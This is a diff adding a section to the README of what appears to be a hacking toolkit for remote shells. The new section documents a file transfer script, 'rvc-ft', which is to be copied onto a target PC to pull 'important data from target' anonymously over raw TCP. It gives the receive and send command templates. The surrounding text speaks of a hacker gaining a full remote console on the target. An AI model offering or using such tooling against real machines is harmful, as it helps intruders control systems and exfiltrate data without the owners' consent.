@@ -77,6 +77,24 @@ for bsh
 This will establish a TCP connection between the hacker and the target shells
 And MAGIC !! you will entirely get the remote console with all above mentioned features !!
 
+### Complimentary File transfer utility
+
+File transfer script (rvc-ft) however is not the actual part of this repo but 
+after some experiments using rsh and bsh we urgently felt a need for an anonymous file transfer
+to get important data from target. For that we wrote our own naive FTP over TCP in python
+to enable raw file transfer. This script is to be copied with the other scripts on
+target pc to enable its features obviously:
+
+1) first start rvc-ft in reciever mode 
+```
+./rvc-ft recv (reciever hostname) (port no.) (path/to/save/file/as)
+```
+2) then transmit the remote file
+```
+./rvc-ft send (reciever hostname) (port no.) (path/to/file)
+```
+3) have patience and DONE!! because no progress bars, etc.
+
 ## Author
 
 * **Rajas Chavadekar** 
